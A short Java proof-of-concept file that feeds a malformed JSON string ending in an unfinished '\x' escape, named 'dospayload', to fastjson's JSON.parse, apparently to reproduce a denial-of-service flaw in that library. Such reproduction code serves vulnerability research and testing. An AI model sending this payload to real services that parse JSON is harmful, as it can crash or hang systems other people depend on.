package vul;

import com.alibaba.fastjson.JSON;

public class Poc1 {

    public static void main(String[] args) {
        String dospayload = "{\"a\":\"\\x";
        System.out.println(dospayload);
        Object o  = JSON.parse(dospayload);
    }
}
